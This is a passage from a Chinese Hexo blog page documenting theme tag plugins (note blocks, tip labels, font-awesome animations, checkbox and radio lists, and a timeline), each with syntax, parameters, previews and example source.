%&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning modern %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger modern %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note flat %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note disabled %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default disabled %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary disabled %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success disabled %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info disabled %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning disabled %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger disabled %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default no-icon %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary no-icon %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success no-icon %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info no-icon %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning no-icon %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger no-icon %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><details class="folding-tag" blue><summary> 方法二 </summary>              <div class='content'>              <ol><li><p><code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; simple %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; simple %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; simple%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; simple %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; simple %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; modern %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; modern%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; modern %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; modern %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; disabled %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; disabled %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; disabled %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; disabled %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; disabled %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue no-icon %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink no-icon %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red no-icon %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple no-icon %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green no-icon %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="上标标签-tip"><a href="#上标标签-tip" class="headerlink" title="上标标签 tip"></a>上标标签 tip</h1><div class="tip cogs"><p>主要样式参考自<a href="https://www.antmoe.com/posts/3b43914f/">小康的butterfly渐变背景标签</a>,自己写了个<code>tip.js</code>来渲染标签，精简了一下代码。</p></div><div class="tabs" id="tip"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#tip-1">标签语法</button></li><li class="tab"><button type="button" data-href="#tip-2">配置参数</button></li><li class="tab active"><button type="button" data-href="#tip-3">样式预览</button></li><li class="tab"><button type="button" data-href="#tip-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="tip-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="tip-2"><ol><li>样式: success,error,warning,bolt,ban,home,sync,cogs,key,bell</li><li>自定义图标: 支持fontawesome。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="tip-3"><div class="tip "><p>默认情况</p></div><div class="tip success"><p>success</p></div><div class="tip error"><p>error</p></div><div class="tip warning"><p>warning</p></div><div class="tip bolt"><p>bolt</p></div><div class="tip ban"><p>ban</p></div><div class="tip home"><p>home</p></div><div class="tip sync"><p>sync</p></div><div class="tip cogs"><p>cogs</p></div><div class="tip key"><p>key</p></div><div class="tip bell"><p>bell</p></div><div class="tip fa-atom"><p>自定义font awesome图标</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="tip-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tip %&#125;默认情况&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip success %&#125;success&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip error %&#125;error&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip warning %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bolt %&#125;bolt&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban %&#125;ban&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip home %&#125;home&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip sync %&#125;sync&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip cogs %&#125;cogs&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip key %&#125;key&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bell %&#125;bell&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip fa-atom %&#125;自定义font awesome图标&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="动态标签-anima"><a href="#动态标签-anima" class="headerlink" title="动态标签 anima"></a>动态标签 anima</h1><div class="tip faa-horizontal animated"><p>动态标签的实质是引用了<a href="https://github.com/l-lin/font-awesome-animation">font-awesome-animation</a>的css样式，不一定局限于tip标签，也可以是其他标签。<br>只不过这里<code>tip.js</code>是我自己写的，所以我清楚它会怎么被渲染成html，才用的这个写法。<br>可以熟读文档，使用html语言来编写其他标签类型。</p></div><div class="tabs" id="tip"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#tip-1">标签语法</button></li><li class="tab"><button type="button" data-href="#tip-2">配置参数</button></li><li class="tab active"><button type="button" data-href="#tip-3">样式预览</button></li><li class="tab"><button type="button" data-href="#tip-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="tip-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="tip-2"><div class="note blue icon simple"><i class="note-icon fas fa-bullhorn"></i><p>更多详情请参看<a href="http://l-lin.github.io/font-awesome-animation/">font-awesome-animation文档</a></p><ol><li>将所需的CSS类添加到图标（或DOM中的任何元素）。</li><li>对于父级悬停样式，需要给目标元素添加指定CSS类，同时还要给目标元素的父级元素添加CSS类<code>faa-parent animated-hover</code>。（详情见示例及示例源码）<br>You can regulate the speed of the animation by adding the CSS class or . faa-fastfaa-slow</li><li>可以通过给目标元素添加CSS类<code>faa-fast</code>或<code>faa-slow</code>来控制动画快慢。</li></ol></div><div class="table-container"><table><thead><tr><th style="text-align:left">On DOM load<br>当页面加载时<br>显示动画</th><th style="text-align:left">On hover<br>当鼠标悬停时<br>显示动画</th><th style="text-align:left">On parent hover<br>当鼠标悬停<br>在父级元素时<br>显示动画</th></tr></thead><tbody><tr><td style="text-align:left"><span><i class="fas fa-wrench faa-wrench animated"></i>&nbsp;faa-wrench animated</span></td><td style="text-align:left"><span><i class="fas fa-wrench faa-wrench animated-hover"></i>&nbsp;faa-wrench animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-wrench faa-wrench"></i>&nbsp;faa-wrench</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-bell faa-ring animated"></i>&nbsp;faa-ring animated</span></td><td style="text-align:left"><span><i class="fas fa-bell faa-ring animated-hover"></i>&nbsp;faa-ring animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-bell faa-ring"></i>&nbsp;faa-ring</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-envelope faa-horizontal animated"></i>&nbsp;faa-horizontal animated</span></td><td style="text-align:left"><span><i class="fas fa-envelope faa-horizontal animated-hover"></i>&nbsp;faa-horizontal animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-envelope faa-horizontal"></i>&nbsp;faa-horizontal</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-thumbs-up faa-vertical animated"></i>&nbsp;faa-vertical animated</span></td><td style="text-align:left"><span><i class="fas fa-thumbs-up faa-vertical animated-hover"></i>&nbsp;faa-vertical animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-thumbs-up faa-vertical"></i>&nbsp;faa-vertical</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-exclamation-triangle faa-flash animated"></i>&nbsp;faa-flash animated</span></td><td style="text-align:left"><span><i class="fas fa-exclamation-triangle faa-flash animated-hover"></i>&nbsp;faa-flash animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-exclamation-triangle faa-flash"></i>&nbsp;faa-flash</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-thumbs-up faa-bounce animated"></i>&nbsp;faa-bounce animated</span></td><td style="text-align:left"><span><i class="fas fa-thumbs-up faa-bounce animated-hover"></i>&nbsp;faa-bounce animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-thumbs-up faa-bounce"></i>&nbsp;faa-bounce</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-spinner faa-spin animated"></i>&nbsp;faa-spin animated</span></td><td style="text-align:left"><span><i class="fas fa-spinner faa-spin animated-hover"></i>&nbsp;faa-spin animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-spinner faa-spin"></i>&nbsp;faa-spin</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-plane faa-tada animated"></i>&nbsp;faa-tada animated</span></td><td style="text-align:left"><span><i class="fas fa-plane faa-tada animated-hover"></i>&nbsp;faa-tada animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-plane faa-tada"></i>&nbsp;faa-tada</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-heart faa-pulse animated"></i>&nbsp;faa-pulse animated</span></td><td style="text-align:left"><span><i class="fas fa-heart faa-pulse animated-hover"></i>&nbsp;faa-pulse animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-heart faa-pulse"></i>&nbsp;faa-pulse</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-envelope faa-shake animated"></i>&nbsp;faa-shake animated</span></td><td style="text-align:left"><span><i class="fas fa-envelope faa-shake animated-hover"></i>&nbsp;faa-shake animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-envelope faa-shake"></i>&nbsp;faa-shake</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-trophy faa-tada animated"></i>&nbsp;faa-tada animated</span></td><td style="text-align:left"><span><i class="fas fa-trophy faa-tada animated-hover"></i>&nbsp;faa-tada animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-trophy faa-tada"></i>&nbsp;faa-tada</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-space-shuttle faa-passing animated"></i>&nbsp;faa-passing animated</span></td><td style="text-align:left"><span><i class="fas fa-space-shuttle faa-passing animated-hover"></i>&nbsp;faa-passing animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-space-shuttle faa-passing"></i>&nbsp;faa-passing</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-space-shuttle faa-passing-reverse animated"></i>&nbsp;faa-passing-reverse animated</span></td><td style="text-align:left"><span><i class="fas fa-space-shuttle faa-passing-reverse animated-hover"></i>&nbsp;faa-passing-reverse animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-space-shuttle faa-passing-reverse"></i>&nbsp;faa-passing-reverse</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-circle faa-burst animated"></i>&nbsp;faa-burst animated</span></td><td style="text-align:left"><span><i class="fas fa-circle faa-burst animated-hover"></i>&nbsp;faa-burst animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-circle faa-burst"></i>&nbsp;faa-burst</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-star faa-falling animated"></i>&nbsp;faa-falling animated</span></td><td style="text-align:left"><span><i class="fas fa-star faa-falling animated-hover"></i>&nbsp;faa-falling animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-star faa-falling"></i>&nbsp;faa-falling</span></td></tr><tr><td style="text-align:left"><span><i class="fas fa-rocket faa-rising animated"></i>&nbsp;faa-rising animated</span></td><td style="text-align:left"><span><i class="fas fa-rocket faa-rising animated-hover"></i>&nbsp;faa-rising animated-hover</span></td><td style="text-align:left"><span class="faa-parent animated-hover"><i class="fas fa-rocket faa-rising"></i>&nbsp;faa-rising</span></td></tr></tbody></table></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="tip-3"><ol><li><p>On DOM load（当页面加载时显示动画）</p><div class="tip warning faa-horizontal animated"><p>warning</p></div><div class="tip ban faa-flash animated"><p>ban</p></div></li><li><p>调整动画速度。</p><div class="tip warning faa-horizontal animated faa-fast"><p>warning</p></div><div class="tip ban faa-flash animated faa-slow"><p>ban</p></div></li><li><p>On hover（当鼠标悬停时显示动画）</p><div class="tip warning faa-horizontal animated-hover"><p>warning</p></div><div class="tip ban faa-flash animated-hover"><p>ban</p></div></li><li><p>On parent hover（当鼠标悬停在父级元素时显示动画）</p><div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">warning</p></div><div class="tip ban faa-parent animated-hover"><p class="faa-flash">ban</p></div></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="tip-4"><ol><li><p>On DOM load（当页面加载时显示动画）</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure></li><li><p>调整动画速度</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated faa-fast %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated faa-slow %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure></li><li><p>On hover（当鼠标悬停时显示动画）</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated-hover %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated-hover %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure></li><li><p>On parent hover（当鼠标悬停在父级元素时显示动画）</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tip warning faa-parent animated-hover %&#125;<span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-horizontal&quot;</span>&gt;</span></span>warning<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-parent animated-hover %&#125;<span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-flash&quot;</span>&gt;</span></span>ban<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="复选列表-checkbox"><a href="#复选列表-checkbox" class="headerlink" title="复选列表 checkbox"></a>复选列表 checkbox</h1><div class="tabs" id="checkbox"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#checkbox-1">标签语法</button></li><li class="tab"><button type="button" data-href="#checkbox-2">配置参数</button></li><li class="tab active"><button type="button" data-href="#checkbox-3">样式预览</button></li><li class="tab"><button type="button" data-href="#checkbox-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="checkbox-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="checkbox-2"><ol><li>样式: plus, minus, times</li><li>颜色: <span class='p red'>red</span>,<span class='p yellow'>yellow</span>,<span class='p green'>green</span>,<span class='p cyan'>cyan</span>,<span class='p blue'>blue</span>,<span class='p gray'>gray</span></li><li>选中状态: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="checkbox-3"><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>黄色 + 默认选中</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>青色 + 默认选中</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>蓝色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="checkbox-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% checkbox 纯文本测试 %&#125;</span><br><span class="line">&#123;% checkbox checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% checkbox red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, 增加 %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, 减少 %&#125;</span><br><span class="line">&#123;% checkbox times red checked, 叉 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="单选列表-radio"><a href="#单选列表-radio" class="headerlink" title="单选列表 radio"></a>单选列表 radio</h1><div class="tabs" id="radio"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#radio-1">标签语法</button></li><li class="tab"><button type="button" data-href="#radio-2">配置参数</button></li><li class="tab active"><button type="button" data-href="#radio-3">样式预览</button></li><li class="tab"><button type="button" data-href="#radio-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="radio-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% radio 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="radio-2"><ol><li>颜色: <span class='p red'>red</span>,<span class='p yellow'>yellow</span>,<span class='p green'>green</span>,<span class='p cyan'>cyan</span>,<span class='p blue'>blue</span>,<span class='p gray'>gray</span></li><li>选中状态: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="radio-3"><div class='checkbox'><input type="radio" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="radio" />            <p>支持自定义颜色</p>            </div><div class='checkbox green'><input type="radio" />            <p>绿色</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>黄色</p>            </div><div class='checkbox cyan'><input type="radio" />            <p>青色</p>            </div><div class='checkbox blue'><input type="radio" />            <p>蓝色</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="radio-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% radio 纯文本测试 %&#125;</span><br><span class="line">&#123;% radio checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% radio red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% radio green, 绿色 %&#125;</span><br><span class="line">&#123;% radio yellow, 黄色 %&#125;</span><br><span class="line">&#123;% radio cyan, 青色 %&#125;</span><br><span class="line">&#123;% radio blue, 蓝色 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="时间轴-timeline"><a href="#时间轴-timeline" class="headerlink" title="时间轴 timeline"></a>时间轴 timeline</h1><div class="tabs" id="timeline"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#timeline-1">标签语法</button></li><li class="tab active"><button type="button" data-href="#timeline-2">样式预览</button></li><li class="tab"><button type="button" data-href="#timeline-3">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="timeline-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% timeline 时间线标题（可选） %&#125;</span><br><span class="line">&#123;% timenode 时间节点（标题） %&#125;</span><br><span class="line">正文内容</span><br><span class="line">&#123;% endtimenode %&#125;</span><br><span class="line">&#123;% timenode 时间节点（标题） %&#125;</span><br><span class="line">正文内容</span><br><span class="line">&#123;% endtimenode %&#125;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="timeline-2"><div class="timeline"><div class="timenode"><div class="meta"><p><p>2020-07-24 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases">2.6.6 -&gt; 3.0</a></p></p></div><div class="body"><ol><li>如果有 <code>hexo-lazyload-image</code> 插件，需要删除并重新安装最新版本，设置 <code>lazyload.isSPA: true</code>。</li><li>2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <code>use_cdn: true</code> 则需要删除。</li><li>2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</li><li>2.x 版本的置顶 <code>top: true</code> 改为了 <code>pin: true</code>，并且同样适用于 <code>layout: 